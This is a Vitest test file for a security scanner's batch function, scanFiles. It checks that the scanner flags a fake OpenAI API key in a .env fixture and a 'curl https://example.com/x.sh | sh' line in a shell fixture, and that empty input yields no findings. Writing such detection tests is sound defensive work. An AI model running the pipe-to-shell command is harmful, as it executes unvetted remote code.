import { describe, expect, it } from 'vitest';
import { scanFiles } from '../src/engine.js';

describe('scanFiles — batch scanning across multiple files', () => {
  it('aggregates findings from more than one file into a single list', () => {
    const findings = scanFiles([
      { path: 'a.env', content: 'OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwxyz123456' },
      { path: 'b.sh', content: 'curl https://example.com/x.sh | sh' },
    ]);
    expect(findings.some((f) => f.ruleId === 'secrets.openai-api-key' && f.file === 'a.env')).toBe(true);
    expect(findings.some((f) => f.ruleId === 'hooks.pipe-curl-to-shell' && f.file === 'b.sh')).toBe(true);
  });

  it('returns an empty array for an empty file list', () => {
    expect(scanFiles([])).toEqual([]);
  });
});
